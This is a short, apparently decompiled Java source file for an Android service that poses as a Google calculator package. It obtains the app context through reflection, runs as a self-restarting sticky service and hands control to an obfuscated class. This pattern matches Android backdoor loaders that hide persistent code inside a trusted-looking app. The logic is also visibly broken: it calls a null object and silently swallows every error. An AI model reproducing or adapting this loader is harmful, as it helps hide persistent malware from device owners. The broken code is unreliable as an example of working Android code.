package com.google.android.calculator;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.os.Looper;

import java.lang.reflect.Method;

public class MainService extends Service {
    public static void start() {
        try {
            c c = null;
            Class<?> clazz = Class.forName("android.app.ActivityThread");
            Method method = clazz.getMethod("currentApplication", new Class[0]);
            Context context = (Context)method.invoke(null, null);
            if (context == null) {

                Looper.getMainLooper();
                c = new c();
                return;
            }
            c.run();
        } catch (ClassNotFoundException classNotFoundException) {

        } catch (Exception exception) {}
    }

    public static void startService(Context paramContext) {
        paramContext.startService(new Intent(paramContext, MainService.class));
    }

    public IBinder onBind(Intent paramIntent) {
        return null;
    }

    public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2) {
        oOoooOooo.start((Context)this);
        return Service.START_STICKY;
    }
}

